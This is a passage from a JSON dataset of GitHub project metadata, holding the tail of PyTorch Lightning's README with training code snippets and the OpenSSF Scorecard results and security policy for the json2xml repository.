src=\"https://pl-bolts-doc-images.s3.us-east-2.amazonaws.com/app-2/studio-badge.svg\" alt=\"Open In Studio\"/></a> |   \n| [LLM finetuning](https://lightning.ai/lightning-ai/studios/finetune-an-llm-with-pytorch-lightning)          | Finetune - LLM (Meta Llama 3.1 8B)                | <a target=\"_blank\" href=\"https://lightning.ai/lightning-ai/studios/finetune-an-llm-with-pytorch-lightning\"><img src=\"https://pl-bolts-doc-images.s3.us-east-2.amazonaws.com/app-2/studio-badge.svg\" alt=\"Open In Studio\"/></a> | \n| [Image generation](https://lightning.ai/lightning-ai/studios/train-a-diffusion-model-with-pytorch-lightning)          | Pretrain - Image generator (diffusion model)                | <a target=\"_blank\" href=\"https://lightning.ai/lightning-ai/studios/train-a-diffusion-model-with-pytorch-lightning\"><img src=\"https://pl-bolts-doc-images.s3.us-east-2.amazonaws.com/app-2/studio-badge.svg\" alt=\"Open In Studio\"/></a> | \n| [Recommendation system](https://lightning.ai/lightning-ai/studios/recommendation-system-with-pytorch-lightning)  | Train - recommendation system (factorization and embedding)    | <a target=\"_blank\" href=\"https://lightning.ai/lightning-ai/studios/recommendation-system-with-pytorch-lightning\"><img src=\"https://pl-bolts-doc-images.s3.us-east-2.amazonaws.com/app-2/studio-badge.svg\" alt=\"Open In Studio\"/></a> | \n| [Time-series forecasting](https://lightning.ai/lightning-ai/studios/time-series-forecasting-with-pytorch-lightning) | Train - Time-series forecasting with LSTM               | <a target=\"_blank\" href=\"https://lightning.ai/lightning-ai/studios/time-series-forecasting-with-pytorch-lightning\"><img src=\"https://pl-bolts-doc-images.s3.us-east-2.amazonaws.com/app-2/studio-badge.svg\" alt=\"Open In Studio\"/></a> | \n\n______________________________________________________________________\n\n## Advanced features\n\nLightning has over [40+ advanced features](https://lightning.ai/docs/pytorch/stable/common/trainer.html#trainer-flags) designed for professional AI research at scale.\n\nHere are some examples:\n\n<div align=\"center\">\n    <img src=\"https://pl-bolts-doc-images.s3.us-east-2.amazonaws.com/features_2.jpg\" max-height=\"600px\">\n  </div>\n\n<details>\n  <summary>Train on 1000s of GPUs without code changes</summary>\n\n```python\n# 8 GPUs\n# no code changes needed\ntrainer = Trainer(accelerator=\"gpu\", devices=8)\n\n# 256 GPUs\ntrainer = Trainer(accelerator=\"gpu\", devices=8, num_nodes=32)\n```\n\n</details>\n\n<details>\n  <summary>Train on other accelerators like TPUs without code changes</summary>\n\n```python\n# no code changes needed\ntrainer = Trainer(accelerator=\"tpu\", devices=8)\n```\n\n</details>\n\n<details>\n  <summary>16-bit precision</summary>\n\n```python\n# no code changes needed\ntrainer = Trainer(precision=16)\n```\n\n</details>\n\n<details>\n  <summary>Experiment managers</summary>\n\n```python\nfrom lightning import loggers\n\n# tensorboard\ntrainer = Trainer(logger=TensorBoardLogger(\"logs/\"))\n\n# weights and biases\ntrainer = Trainer(logger=loggers.WandbLogger())\n\n# comet\ntrainer = Trainer(logger=loggers.CometLogger())\n\n# mlflow\ntrainer = Trainer(logger=loggers.MLFlowLogger())\n\n# neptune\ntrainer = Trainer(logger=loggers.NeptuneLogger())\n\n# ... and dozens more\n```\n\n</details>\n\n<details>\n\n<summary>Early Stopping</summary>\n\n```python\nes = EarlyStopping(monitor=\"val_loss\")\ntrainer = Trainer(callbacks=[es])\n```\n\n</details>\n\n<details>\n  <summary>Checkpointing</summary>\n\n```python\ncheckpointing = ModelCheckpoint(monitor=\"val_loss\")\ntrainer = Trainer(callbacks=[checkpointing])\n```\n\n</details>\n\n<details>\n  <summary>Export to torchscript (JIT) (production use)</summary>\n\n```python\n# torchscript\nautoencoder = LitAutoEncoder()\ntorch.jit.save(autoencoder.to_torchscript(), \"model.pt\")\n```\n\n</details>\n\n<details>\n  <summary>Export to ONNX (production use)</summary>\n\n```python\n# onnx\nwith tempfile.NamedTemporaryFile(suffix=\".onnx\", delete=False) as tmpfile:\n    autoencoder = LitAutoEncoder()\n    input_sample = torch.randn((1, 64))\n    autoencoder.to_onnx(tmpfile.name, input_sample, export_params=True)\n    os.path.isfile(tmpfile.name)\n```\n\n</details>\n\n______________________________________________________________________\n\n## Advantages over unstructured PyTorch\n\n- Models become hardware agnostic\n- Code is clear to read because engineering code is abstracted away\n- Easier to reproduce\n- Make fewer mistakes because lightning handles the tricky engineering\n- Keeps all the flexibility (LightningModules are still PyTorch modules), but removes a ton of boilerplate\n- Lightning has dozens of integrations with popular machine learning tools.\n- [Tested rigorously with every new PR](https://github.com/Lightning-AI/lightning/tree/master/tests). We test every combination of PyTorch and Python supported versions, every OS, multi GPUs and even TPUs.\n- Minimal running speed overhead (about 300 ms per epoch compared with pure PyTorch).\n\n______________________________________________________________________\n\n<div align=\"center\">\n    <a href=\"https://lightning.ai/docs/pytorch/stable/\">Read the PyTorch Lightning docs</a>\n</div>\n\n______________________________________________________________________\n\n&nbsp;\n&nbsp;\n\n# Lightning Fabric: Expert control\n\nRun on any device at any scale with expert-level control over PyTorch training loop and scaling strategy. You can even write your own Trainer.\n\nFabric is designed for the most complex models like foundation model scaling, LLMs, diffusion, transformers, reinforcement learning, active learning. Of any size.\n\n<table>\n<tr>\n<th>What to change</th>\n<th>Resulting Fabric Code (copy me!)</th>\n</tr>\n<tr>\n<td>\n<sub>\n\n```diff\n+ import lightning as L\n  import torch; import torchvision as tv\n\n dataset = tv.datasets.CIFAR10(\"data\", download=True,\n                               train=True,\n                               transform=tv.transforms.ToTensor())\n\n+ fabric = L.Fabric()\n+ fabric.launch()\n\n  model = tv.models.resnet18()\n  optimizer = torch.optim.SGD(model.parameters(), lr=0.001)\n- device = \"cuda\" if torch.cuda.is_available() else \"cpu\"\n- model.to(device)\n+ model, optimizer = fabric.setup(model, optimizer)\n\n  dataloader = torch.utils.data.DataLoader(dataset, batch_size=8)\n+ dataloader = fabric.setup_dataloaders(dataloader)\n\n  model.train()\n  num_epochs = 10\n  for epoch in range(num_epochs):\n      for batch in dataloader:\n          inputs, labels = batch\n-         inputs, labels = inputs.to(device), labels.to(device)\n          optimizer.zero_grad()\n          outputs = model(inputs)\n          loss = torch.nn.functional.cross_entropy(outputs, labels)\n-         loss.backward()\n+         fabric.backward(loss)\n          optimizer.step()\n          print(loss.data)\n```\n\n</sub>\n<td>\n<sub>\n\n```Python\nimport lightning as L\nimport torch; import torchvision as tv\n\ndataset = tv.datasets.CIFAR10(\"data\", download=True,\n                              train=True,\n                              transform=tv.transforms.ToTensor())\n\nfabric = L.Fabric()\nfabric.launch()\n\nmodel = tv.models.resnet18()\noptimizer = torch.optim.SGD(model.parameters(), lr=0.001)\nmodel, optimizer = fabric.setup(model, optimizer)\n\ndataloader = torch.utils.data.DataLoader(dataset, batch_size=8)\ndataloader = fabric.setup_dataloaders(dataloader)\n\nmodel.train()\nnum_epochs = 10\nfor epoch in range(num_epochs):\n    for batch in dataloader:\n        inputs, labels = batch\n        optimizer.zero_grad()\n        outputs = model(inputs)\n        loss = torch.nn.functional.cross_entropy(outputs, labels)\n        fabric.backward(loss)\n        optimizer.step()\n        print(loss.data)\n```\n\n</sub>\n</td>\n</tr>\n</table>\n\n## Key features\n\n<details>\n  <summary>Easily switch from running on CPU to GPU (Apple Silicon, CUDA, …), TPU, multi-GPU or even multi-node training</summary>\n\n```python\n# Use your available hardware\n# no code changes needed\nfabric = Fabric()\n\n# Run on GPUs (CUDA or MPS)\nfabric = Fabric(accelerator=\"gpu\")\n\n# 8 GPUs\nfabric = Fabric(accelerator=\"gpu\", devices=8)\n\n# 256 GPUs, multi-node\nfabric = Fabric(accelerator=\"gpu\", devices=8, num_nodes=32)\n\n# Run on TPUs\nfabric = Fabric(accelerator=\"tpu\")\n```\n\n</details>\n\n<details>\n  <summary>Use state-of-the-art distributed training strategies (DDP, FSDP, DeepSpeed) and mixed precision out of the box</summary>\n\n```python\n# Use state-of-the-art distributed training techniques\nfabric = Fabric(strategy=\"ddp\")\nfabric = Fabric(strategy=\"deepspeed\")\nfabric = Fabric(strategy=\"fsdp\")\n\n# Switch the precision\nfabric = Fabric(precision=\"16-mixed\")\nfabric = Fabric(precision=\"64\")\n```\n\n</details>\n\n<details>\n  <summary>All the device logic boilerplate is handled for you</summary>\n\n```diff\n  # no more of this!\n- model.to(device)\n- batch.to(device)\n```\n\n</details>\n\n<details>\n  <summary>Build your own custom Trainer using Fabric primitives for training checkpointing, logging, and more</summary>\n\n```python\nimport lightning as L\n\n\nclass MyCustomTrainer:\n    def __init__(self, accelerator=\"auto\", strategy=\"auto\", devices=\"auto\", precision=\"32-true\"):\n        self.fabric = L.Fabric(accelerator=accelerator, strategy=strategy, devices=devices, precision=precision)\n\n    def fit(self, model, optimizer, dataloader, max_epochs):\n        self.fabric.launch()\n\n        model, optimizer = self.fabric.setup(model, optimizer)\n        dataloader = self.fabric.setup_dataloaders(dataloader)\n        model.train()\n\n        for epoch in range(max_epochs):\n            for batch in dataloader:\n                input, target = batch\n                optimizer.zero_grad()\n                output = model(input)\n                loss = loss_fn(output, target)\n                self.fabric.backward(loss)\n                optimizer.step()\n```\n\nYou can find a more extensive example in our [examples](examples/fabric/build_your_own_trainer)\n\n</details>\n\n______________________________________________________________________\n\n<div align=\"center\">\n    <a href=\"https://lightning.ai/docs/fabric/stable/\">Read the Lightning Fabric docs</a>\n</div>\n\n______________________________________________________________________\n\n&nbsp;\n&nbsp;\n\n## Examples\n\n###### Self-supervised Learning\n\n- [CPC transforms](https://lightning-bolts.readthedocs.io/en/stable/transforms/self_supervised.html#cpc-transforms)\n- [Moco v2 transforms](https://lightning-bolts.readthedocs.io/en/stable/transforms/self_supervised.html#moco-v2-transforms)\n- [SimCLR transforms](https://lightning-bolts.readthedocs.io/en/stable/transforms/self_supervised.html#simclr-transforms)\n\n###### Convolutional Architectures\n\n- [GPT-2](https://lightning-bolts.readthedocs.io/en/stable/models/convolutional.html#gpt-2)\n- [UNet](https://lightning-bolts.readthedocs.io/en/stable/models/convolutional.html#unet)\n\n###### Reinforcement Learning\n\n- [DQN Loss](https://lightning-bolts.readthedocs.io/en/stable/losses.html#dqn-loss)\n- [Double DQN Loss](https://lightning-bolts.readthedocs.io/en/stable/losses.html#double-dqn-loss)\n- [Per DQN Loss](https://lightning-bolts.readthedocs.io/en/stable/losses.html#per-dqn-loss)\n\n###### GANs\n\n- [Basic GAN](https://lightning-bolts.readthedocs.io/en/stable/models/gans.html#basic-gan)\n- [DCGAN](https://lightning-bolts.readthedocs.io/en/stable/models/gans.html#dcgan)\n\n###### Classic ML\n\n- [Logistic Regression](https://lightning-bolts.readthedocs.io/en/stable/models/classic_ml.html#logistic-regression)\n- [Linear Regression](https://lightning-bolts.readthedocs.io/en/stable/models/classic_ml.html#linear-regression)\n\n&nbsp;\n&nbsp;\n\n## Continuous Integration\n\nLightning is rigorously tested across multiple CPUs, GPUs and TPUs and against major Python and PyTorch versions.\n\n###### \\*Codecov is > 90%+ but build delays may show less\n\n<details>\n  <summary>Current build statuses</summary>\n\n<center>\n\n|       System / PyTorch ver.        | 1.13                                                                                                                                                                                                                            | 2.0                                                                                                                                                                                                                             |                                                                                                               2.1                                                                                                               |\n| :--------------------------------: | :-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------: | :-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------: |:-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------:|\n|        Linux py3.9 \\[GPUs\\]        |  |  | [![Build Status](https://dev.azure.com/Lightning-AI/lightning/_apis/build/status%2Fpytorch-lightning%20%28GPUs%29?branchName=master)](https://dev.azure.com/Lightning-AI/lightning/_build/latest?definitionId=24&branchName=master) |\n|        Linux py3.9 \\[TPUs\\]        |                                                                                                                                                                                                                                 |  [![Test PyTorch - TPU](https://github.com/Lightning-AI/lightning/actions/workflows/tpu-tests.yml/badge.svg)](https://github.com/Lightning-AI/lightning/actions/workflows/tpu-tests.yml)     |      |\n|  Linux (multiple Python versions)  | [![Test PyTorch](https://github.com/Lightning-AI/lightning/actions/workflows/ci-tests-pytorch.yml/badge.svg)](https://github.com/Lightning-AI/lightning/actions/workflows/ci-tests-pytorch.yml)                                 | [![Test PyTorch](https://github.com/Lightning-AI/lightning/actions/workflows/ci-tests-pytorch.yml/badge.svg)](https://github.com/Lightning-AI/lightning/actions/workflows/ci-tests-pytorch.yml)                                 |                 [![Test PyTorch](https://github.com/Lightning-AI/lightning/actions/workflows/ci-tests-pytorch.yml/badge.svg)](https://github.com/Lightning-AI/lightning/actions/workflows/ci-tests-pytorch.yml)                 |\n|   OSX (multiple Python versions)   | [![Test PyTorch](https://github.com/Lightning-AI/lightning/actions/workflows/ci-tests-pytorch.yml/badge.svg)](https://github.com/Lightning-AI/lightning/actions/workflows/ci-tests-pytorch.yml)                                 | [![Test PyTorch](https://github.com/Lightning-AI/lightning/actions/workflows/ci-tests-pytorch.yml/badge.svg)](https://github.com/Lightning-AI/lightning/actions/workflows/ci-tests-pytorch.yml)                                 |                 [![Test PyTorch](https://github.com/Lightning-AI/lightning/actions/workflows/ci-tests-pytorch.yml/badge.svg)](https://github.com/Lightning-AI/lightning/actions/workflows/ci-tests-pytorch.yml)                 |\n| Windows (multiple Python versions) | [![Test PyTorch](https://github.com/Lightning-AI/lightning/actions/workflows/ci-tests-pytorch.yml/badge.svg)](https://github.com/Lightning-AI/lightning/actions/workflows/ci-tests-pytorch.yml)                                 | [![Test PyTorch](https://github.com/Lightning-AI/lightning/actions/workflows/ci-tests-pytorch.yml/badge.svg)](https://github.com/Lightning-AI/lightning/actions/workflows/ci-tests-pytorch.yml)                                 |                 [![Test PyTorch](https://github.com/Lightning-AI/lightning/actions/workflows/ci-tests-pytorch.yml/badge.svg)](https://github.com/Lightning-AI/lightning/actions/workflows/ci-tests-pytorch.yml)                 |\n\n</center>\n</details>\n\n&nbsp;\n&nbsp;\n\n## Community\n\nThe lightning community is maintained by\n\n- [10+ core contributors](https://lightning.ai/docs/pytorch/latest/community/governance.html) who are all a mix of professional engineers, Research Scientists, and Ph.D. students from top AI labs.\n- 800+ community contributors.\n\nWant to help us build Lightning and reduce boilerplate for thousands of researchers? [Learn how to make your first contribution here](https://lightning.ai/docs/pytorch/stable/generated/CONTRIBUTING.html)\n\nLightning is also part of the [PyTorch ecosystem](https://pytorch.org/ecosystem/) which requires projects to have solid testing, documentation and support.\n\n### Asking for help\n\nIf you have any questions please:\n\n1. [Read the docs](https://lightning.ai/docs).\n1. [Search through existing Discussions](https://github.com/Lightning-AI/lightning/discussions), or [add a new question](https://github.com/Lightning-AI/lightning/discussions/new)\n1. [Join our discord](https://discord.com/invite/tfXFetEZxv).\n",
        "num_commits": 10434,
        "project_age_days": 2040,
        "project_created_at": "2019-03-31",
        "latest_updated_at": "2024-10-29",
        "latest_pushed_at": "2024-10-28",
        "num_contributors": 441,
        "num_pull": 10292,
        "num_issues": 17404,
        "num_opening_issue": 876,
        "project_size(kB)": 131103,
        "num_stargazers": 28279,
        "num_watchers": 28279,
        "num_forks": 3380,
        "num_subscribers": 250,
        "SecurityPolicy_created_at": "2021-12-17 01:31:03",
        "SecurityPolicy_commit_history": [
            {
                "commit_id": "aa4d0d053d23d051d9921ed3d3c044558aa122d9",
                "url": "https://github.com/Lightning-AI/pytorch-lightning/commit/aa4d0d053d23d051d9921ed3d3c044558aa122d9",
                "date": "2023-05-21 06:23:50"
            },
            {
                "commit_id": "58014846ee0fb54b92e4bfb4c0965b72bc0a9641",
                "url": "https://github.com/Lightning-AI/pytorch-lightning/commit/58014846ee0fb54b92e4bfb4c0965b72bc0a9641",
                "date": "2022-08-10 13:32:12"
            },
            {
                "commit_id": "4ee01b715c543b7db969bb4422273cc07449d522",
                "url": "https://github.com/Lightning-AI/pytorch-lightning/commit/4ee01b715c543b7db969bb4422273cc07449d522",
                "date": "2021-12-17 01:31:03"
            }
        ],
        "project_security_labels": [],
        "security_issues": [],
        "SecurityPolicy_reporting_mechanism": "email",
        "num_security_issues_after_policy": 0,
        "num_security_issue_and_pull": 0,
        "security_issues_created_after_policy": [],
        "SecurityPolicy_content_category": [],
        "num_noncompliant_security_discuss_issue": 0,
        "num_noncompliant_security_pull": 0,
        "has_generic_policy": false
    },
    {
        "project_name": "vinitkumar/json2xml",
        "project_url": "https://github.com/vinitkumar/json2xml",
        "SSF": {
            "date": "2024-10-29T22:30:45+07:00",
            "repo": {
                "name": "github.com/vinitkumar/json2xml",
                "commit": "d72b955ebdbe8fc86f42102abcb5661b4a74a48e"
            },
            "scorecard": {
                "version": "5.0.0",
                "commit": "ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4"
            },
            "score": 6.6,
            "checks": [
                {
                    "details": null,
                    "score": 10,
                    "reason": "no binaries found in the repo",
                    "name": "Binary-Artifacts",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#binary-artifacts",
                        "short": "Determines if the project has generated executable (binary) artifacts in the source repository."
                    }
                },
                {
                    "details": [
                        "Info: 'allow deletion' disabled on branch 'master'",
                        "Info: 'force pushes' disabled on branch 'master'",
                        "Warn: required approving review count is 1 on branch 'master'",
                        "Warn: codeowners review is required - but no codeowners file found in repo",
                        "Warn: no status checks found to merge onto branch 'master'",
                        "Info: PRs are required in order to make changes on branch 'master'"
                    ],
                    "score": 6,
                    "reason": "branch protection is not maximal on development and all release branches",
                    "name": "Branch-Protection",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#branch-protection",
                        "short": "Determines if the default and release branches are protected with GitHub's branch protection settings."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "15 out of 15 merged PRs checked by a CI test -- score normalized to 10",
                    "name": "CI-Tests",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#ci-tests",
                        "short": "Determines if the project runs tests before pull requests are merged."
                    }
                },
                {
                    "details": null,
                    "score": 0,
                    "reason": "no effort to earn an OpenSSF best practices badge detected",
                    "name": "CII-Best-Practices",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#cii-best-practices",
                        "short": "Determines if the project has an OpenSSF (formerly CII) Best Practices Badge."
                    }
                },
                {
                    "details": null,
                    "score": 0,
                    "reason": "Found 1/25 approved changesets -- score normalized to 0",
                    "name": "Code-Review",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#code-review",
                        "short": "Determines if the project requires human code review before pull requests (aka merge requests) are merged."
                    }
                },
                {
                    "details": [
                        "Info: django-cms contributor org/company found, socialschools b.v. contributor org/company found, ciena contributor org/company found, gotchacode contributor org/company found, SocialSchools contributor org/company found, "
                    ],
                    "score": 10,
                    "reason": "project has 5 contributing companies or organizations",
                    "name": "Contributors",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#contributors",
                        "short": "Determines if the project has a set of contributors from multiple organizations (e.g., companies)."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "no dangerous workflow patterns detected",
                    "name": "Dangerous-Workflow",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#dangerous-workflow",
                        "short": "Determines if the project's GitHub Action workflows avoid dangerous patterns."
                    }
                },
                {
                    "details": [
                        "Info: detected update tool: Dependabot: :0"
                    ],
                    "score": 10,
                    "reason": "update tool detected",
                    "name": "Dependency-Update-Tool",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#dependency-update-tool",
                        "short": "Determines if the project uses a dependency update tool."
                    }
                },
                {
                    "details": [
                        "Warn: no fuzzer integrations found"
                    ],
                    "score": 0,
                    "reason": "project is not fuzzed",
                    "name": "Fuzzing",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#fuzzing",
                        "short": "Determines if the project uses fuzzing."
                    }
                },
                {
                    "details": [
                        "Info: project has a license file: LICENSE:0",
                        "Warn: project license file does not contain an FSF or OSI license."
                    ],
                    "score": 9,
                    "reason": "license file detected",
                    "name": "License",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#license",
                        "short": "Determines if the project has defined a license."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "19 commit(s) and 1 issue activity found in the last 90 days -- score normalized to 10",
                    "name": "Maintained",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#maintained",
                        "short": "Determines if the project is \"actively maintained\"."
                    }
                },
                {
                    "details": [
                        "Info: Project packages its releases by way of GitHub Actions.: .github/workflows/publish-to-live-pypi.yml:9"
                    ],
                    "score": 10,
                    "reason": "packaging workflow detected",
                    "name": "Packaging",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#packaging",
                        "short": "Determines if the project is published as a package that others can easily download, install, easily update, and uninstall."
                    }
                },
                {
                    "details": [
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/codeql.yml:27: update your workflow using https://app.stepsecurity.io/secureworkflow/vinitkumar/json2xml/codeql.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/codeql.yml:30: update your workflow using https://app.stepsecurity.io/secureworkflow/vinitkumar/json2xml/codeql.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/codeql.yml:36: update your workflow using https://app.stepsecurity.io/secureworkflow/vinitkumar/json2xml/codeql.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/codeql.yml:39: update your workflow using https://app.stepsecurity.io/secureworkflow/vinitkumar/json2xml/codeql.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/lint.yml:35: update your workflow using https://app.stepsecurity.io/secureworkflow/vinitkumar/json2xml/lint.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/lint.yml:37: update your workflow using https://app.stepsecurity.io/secureworkflow/vinitkumar/json2xml/lint.yml/master?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/lint.yml:43: update your workflow using https://app.stepsecurity.io/secureworkflow/vinitkumar/json2xml/lint.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/lint.yml:15: update your workflow using https://app.stepsecurity.io/secureworkflow/vinitkumar/json2xml/lint.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/lint.yml:17: update your workflow using https://app.stepsecurity.io/secureworkflow/vinitkumar/json2xml/lint.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/publish-to-live-pypi.yml:13: update your workflow using https://app.stepsecurity.io/secureworkflow/vinitkumar/json2xml/publish-to-live-pypi.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/publish-to-live-pypi.yml:15: update your workflow using https://app.stepsecurity.io/secureworkflow/vinitkumar/json2xml/publish-to-live-pypi.yml/master?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/publish-to-live-pypi.yml:36: update your workflow using https://app.stepsecurity.io/secureworkflow/vinitkumar/json2xml/publish-to-live-pypi.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/publish-to-test-pypi.yml:14: update your workflow using https://app.stepsecurity.io/secureworkflow/vinitkumar/json2xml/publish-to-test-pypi.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/publish-to-test-pypi.yml:16: update your workflow using https://app.stepsecurity.io/secureworkflow/vinitkumar/json2xml/publish-to-test-pypi.yml/master?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/publish-to-test-pypi.yml:36: update your workflow using https://app.stepsecurity.io/secureworkflow/vinitkumar/json2xml/publish-to-test-pypi.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/pythonpackage.yml:33: update your workflow using https://app.stepsecurity.io/secureworkflow/vinitkumar/json2xml/pythonpackage.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/pythonpackage.yml:35: update your workflow using https://app.stepsecurity.io/secureworkflow/vinitkumar/json2xml/pythonpackage.yml/master?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/pythonpackage.yml:48: update your workflow using https://app.stepsecurity.io/secureworkflow/vinitkumar/json2xml/pythonpackage.yml/master?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/pythonpackage.yml:53: update your workflow using https://app.stepsecurity.io/secureworkflow/vinitkumar/json2xml/pythonpackage.yml/master?enable=pin",
                        "Warn: pipCommand not pinned by hash: .github/workflows/lint.yml:22",
                        "Warn: pipCommand not pinned by hash: .github/workflows/lint.yml:23",
                        "Warn: pipCommand not pinned by hash: .github/workflows/lint.yml:42",
                        "Warn: pipCommand not pinned by hash: .github/workflows/publish-to-live-pypi.yml:21",
                        "Warn: pipCommand not pinned by hash: .github/workflows/publish-to-test-pypi.yml:22",
                        "Warn: pipCommand not pinned by hash: .github/workflows/pythonpackage.yml:41",
                        "Warn: pipCommand not pinned by hash: .github/workflows/pythonpackage.yml:42",
                        "Warn: pipCommand not pinned by hash: .github/workflows/pythonpackage.yml:43",
                        "Info:   0 out of  14 GitHub-owned GitHubAction dependencies pinned",
                        "Info:   0 out of   5 third-party GitHubAction dependencies pinned",
                        "Info:   0 out of   8 pipCommand dependencies pinned"
                    ],
                    "score": 0,
                    "reason": "dependency not pinned by hash detected -- score normalized to 0",
                    "name": "Pinned-Dependencies",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#pinned-dependencies",
                        "short": "Determines if the project has declared and pinned the dependencies of its build process."
                    }
                },
                {
                    "details": [
                        "Info: SAST configuration detected: CodeQL",
                        "Info: all commits (15) are checked with a SAST tool"
                    ],
                    "score": 10,
                    "reason": "SAST tool is run on all commits",
                    "name": "SAST",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#sast",
                        "short": "Determines if the project uses static code analysis."
                    }
                },
                {
                    "details": [
                        "Info: security policy file detected: SECURITY.md:1",
                        "Info: Found linked content: SECURITY.md:1",
                        "Info: Found disclosure, vulnerability, and/or timelines in security policy: SECURITY.md:1",
                        "Info: Found text in security policy: SECURITY.md:1"
                    ],
                    "score": 10,
                    "reason": "security policy file detected",
                    "name": "Security-Policy",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#security-policy",
                        "short": "Determines if the project has published a security policy."
                    }
                },
                {
                    "details": null,
                    "score": -1,
                    "reason": "no releases found",
                    "name": "Signed-Releases",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#signed-releases",
                        "short": "Determines if the project cryptographically signs release artifacts."
                    }
                },
                {
                    "details": [
                        "Info: jobLevel 'contents' permission set to 'read': .github/workflows/codeql.yml:17",
                        "Info: jobLevel 'actions' permission set to 'read': .github/workflows/codeql.yml:16",
                        "Warn: no topLevel permission defined: .github/workflows/codeql.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/lint.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/publish-to-live-pypi.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/publish-to-test-pypi.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/pythonpackage.yml:1",
                        "Info: no jobLevel write permissions found"
                    ],
                    "score": 0,
                    "reason": "detected GitHub workflow tokens with excessive permissions",
                    "name": "Token-Permissions",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#token-permissions",
                        "short": "Determines if the project's workflows follow the principle of least privilege."
                    }
                },
                {
                    "details": [
                        "Warn: Project is vulnerable to: PYSEC-2023-117",
                        "Warn: Project is vulnerable to: GHSA-3f84-rpwh-47g6",
                        "Warn: Project is vulnerable to: GHSA-9298-4cf8-g4wj"
                    ],
                    "score": 7,
                    "reason": "3 existing vulnerabilities detected",
                    "name": "Vulnerabilities",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#vulnerabilities",
                        "short": "Determines if the project has open, known unfixed vulnerabilities."
                    }
                }
            ],
            "metadata": null
        },
        "SecurityPolicy_url_endpoint": "https://api.github.com/repos/vinitkumar/json2xml/contents/SECURITY.md",
        "SecurityPolicy_content": "## Security contact information\n\nTo report a security vulnerability, please use the\n[Tidelift security contact](https://tidelift.com/security).\nTidelift will coordinate the fix and disclosure.\n",
        "project_all_labels": [
            "bug",
            "can't reproduce",
            "dependencies",
            "duplicate",
            "enhancement",
            "fixed",
